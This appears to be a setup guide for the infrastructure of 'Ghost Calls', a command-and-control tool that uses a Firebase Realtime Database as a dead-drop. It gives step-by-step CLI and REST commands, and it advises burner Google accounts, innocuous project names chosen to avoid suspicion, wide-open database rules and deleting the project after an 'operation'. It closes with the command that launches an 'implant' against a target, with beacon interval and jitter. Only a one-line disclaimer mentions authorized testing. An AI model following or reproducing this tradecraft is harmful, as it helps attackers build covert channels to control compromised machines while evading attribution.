# Firebase Project Setup Guide

This guide walks through creating a Firebase project for Ghost Calls using the Firebase CLI. No browser required.

## Prerequisites

- [Node.js](https://nodejs.org/) 18+ (for `firebase-tools` CLI)
- A Google account (use a **burner account** — never link to personal accounts)
- `curl` for testing API endpoints

---

## Step 1: Install Firebase CLI

```bash
npm install -g firebase-tools
```

Verify installation:

```bash
firebase --version
# Expected: 13.x or higher
```

---

## Step 2: Log In

```bash
firebase login
```

This opens a browser for OAuth authentication. If running headless (no browser), use:

```bash
firebase login --no-localhost
```

Follow the printed URL instructions to complete authentication.

---

## Step 3: Create the Firebase Project

```bash
# Create a new project (interactive — you'll be prompted for a project ID)
firebase projects:create

# You will be prompted:
# ? Please specify a unique project id (my-c2-project): ghost-calls-operational-42
# ? What would you like to call your project? Ghost Calls
```

> **Important:** The project ID must be globally unique across all Firebase projects. Choose something innocuous that won't raise suspicion. Good examples: `weather-app-sync-8472`, `note-taking-backup`. Bad examples: `c2-command-control`, `hacker-op-2024`.

### Headless Project Creation (Alternative)

If `firebase projects:create` is too interactive, use the Firebase Console REST API directly:

```bash
# First, get your access token
FIREBASE_TOKEN=$(firebase login:ci)

# Create the project
curl -X POST "https://firebase.googleapis.com/v1/projects" \
  -H "Authorization: Bearer $FIREBASE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "projectId": "ghost-calls-operational-42",
    "displayName": "Note Sync",
    "labels": {
      "purpose": "development"
    }
  }'
```

---

## Step 4: Enable Firebase for the Project

```bash
# Add Firebase to the project
firebase init

# Select only "Firestore" or "Database" and "Hosting" if needed
# For Ghost Calls, we only need Realtime Database, so:
# - Toggle "Realtime Database" with SPACE
# - Press ENTER to confirm
```

If you get an error about project not found, the project may not have Firebase resources initialized yet. Fix:

```bash
# Explicitly add Firebase to the project
firebase projects:addfirebase <project-id>
```

---

## Step 5: Enable the Realtime Database

### Via CLI:

```bash
# List available Firebase features — verify RTDB is available
firebase --project=<project-id> firestore:databases:list 2>/dev/null || true

# Initialize Realtime Database through CLI
firebase --project=<project-id> init database

# You'll be prompted:
# ? What file should be used for Realtime Database Security Rules? database.rules.json
# Accept default or specify rtdb.rules.json
```

### Via REST API:

```bash
# Enable Realtime Database via REST
curl -X POST \
  "https://firebasedatabase.googleapis.com/v1/projects/<project-id>/locations/us-central1/instances" \
  -H "Authorization: Bearer $FIREBASE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"databaseId": "<project-id>-default-rtdb", "type": "DEFAULT_DATABASE"}'
```

Wait 30-60 seconds for the database instance to provision.

---

## Step 6: Get Your Database URL

```bash
# List Firebase projects and their resources
firebase --project=<project-id> databases:list 2>/dev/null || true

# OR use the REST API to find the database URL
curl -s \
  "https://firebasedatabase.googleapis.com/v1/projects/<project-id>/locations/us-central1/instances" \
  -H "Authorization: Bearer $FIREBASE_TOKEN" \
  | jq -r '.instances[].databaseUrl'
```

Your database URL will look like:
```
https://<project-id>-default-rtdb.firebaseio.com
```

---

## Step 7: Set Database Rules

For initial testing, set wide-open rules.

### Write the rules file (`database.rules.json`):

```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

### Deploy rules:

```bash
# Via firebase-tools CLI
firebase --project=<project-id> deploy --only database

# OR via REST API
curl -X PUT \
  "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json" \
  -H "Authorization: Bearer $FIREBASE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"rules":{".read":true,".write":true}}'
```

### Verify rules are deployed:

```bash
curl -s "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json" | jq .
```

Expected output:
```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

---

## Step 8: Get Firebase API Key

The API key is needed if you want to use Firebase Authentication or FCM. For the basic RTDB dead-drop, you don't strictly need it — but it's useful for auth-enabled access.

### Via CLI:

```bash
# List all Firebase project resources including Web API Key
firebase --project=<project-id> apps:list 2>/dev/null

# If no apps exist, create a Web app:
firebase --project=<project-id> apps:create WEB "ghost-ctl"

# Get the config for your web app (includes apiKey):
firebase --project=<project-id> apps:sdkconfig WEB <app-id>
```

### Via Google Cloud Console API:

```bash
# List all API keys for the project
curl -s \
  "https://apikeys.googleapis.com/v2/projects/<project-id>/locations/global/keys" \
  -H "Authorization: Bearer $FIREBASE_TOKEN" \
  | jq '.keys[].displayName, .keys[].keyString'
```

---

## Step 9: Test the Database

Verify end-to-end connectivity:

```bash
# Write a test value
curl -X PUT \
  "https://<project-id>-default-rtdb.firebaseio.com/test/hello.json" \
  -H "Content-Type: application/json" \
  -d '"world"'

# Read it back
curl -s "https://<project-id>-default-rtdb.firebaseio.com/test/hello.json"

# Expected: "world"

# Delete the test value
curl -X DELETE "https://<project-id>-default-rtdb.firebaseio.com/test/hello.json"
```

---

## Step 10: (Optional) Enable Firebase Cloud Messaging

For push-based command delivery (advanced):

```bash
# Enable FCM for the project
curl -X POST \
  "https://fcm.googleapis.com/v1/projects/<project-id>/messages:send" \
  -H "Authorization: Bearer $FIREBASE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message":{"topic":"test","data":{"test":"true"}}}'
```

To get FCM server credentials for the HTTP v1 API:

```bash
# Navigate to the Google Cloud Console IAM area for the Firebase service account
gcloud iam service-accounts list --project=<project-id>

# The Firebase service account looks like:
# firebase-adminsdk-xxxxx@<project-id>.iam.gserviceaccount.com

# Generate a key for this account:
gcloud iam service-accounts keys create firebase-key.json \
  --iam-account=firebase-adminsdk-xxxxx@<project-id>.iam.gserviceaccount.com \
  --project=<project-id>
```

Then use this key with Google's OAuth endpoints to get access tokens for FCM API calls. This is beyond the scope of the basic RTDB setup.

---

## Step 11: Clean Up (After Operation)

**Always** delete the Firebase project when the operation is complete:

```bash
# Delete the project (this cannot be undone)
firebase projects:delete <project-id>

# Confirm the deletion
# > ? Are you sure? Yes
```

Or via REST:

```bash
curl -X DELETE \
  "https://firebase.googleapis.com/v1/projects/<project-id>" \
  -H "Authorization: Bearer $FIREBASE_TOKEN"
```

---

## Environment Variables for Ghost Calls

Once your project is configured, export these for the Ghost Calls server:

```bash
# Database URL (from Step 6)
export FIREBASE_URL="https://<project-id>-default-rtdb.firebaseio.com"

# Encryption secret — generate a strong random key
export GHOST_SECRET="$(openssl rand -hex 32)"

# Port for the HTTP status page (optional, default: 9090)
export GHOST_PORT="9090"
```

For the implant:

```bash
./ghost-client \
  --db-url "$FIREBASE_URL" \
  --id "target-001" \
  --secret "$GHOST_SECRET" \
  --interval 30s \
  --jitter 15s
```

---

## Troubleshooting

### "Permission denied" when reading/writing data
Your database rules are too restrictive. Either set `.read` and `.write` to `true`, or create proper auth rules.

### "Project not found" errors
The Firebase project may not have Realtime Database initialized. Run through Step 5 again.

### "Quota exceeded"
Free tier limits:
- 200 simultaneous connections
- 10 MB stored
- 10 GB/month downloaded
- 10,000 writes/hour

Upgrade to Blaze (pay-as-you-go) plan for higher limits, or reduce poll frequency.

### "Access denied" on REST calls
Your authentication token may be expired. Run `firebase login` again or generate a new CI token.

### Can't find the database URL
The database may still be provisioning. Wait 1-2 minutes and try again. Use the REST API in Step 6 to check.

## DISCLAIMER

For authorized Security Testing or Educational Purposes only.
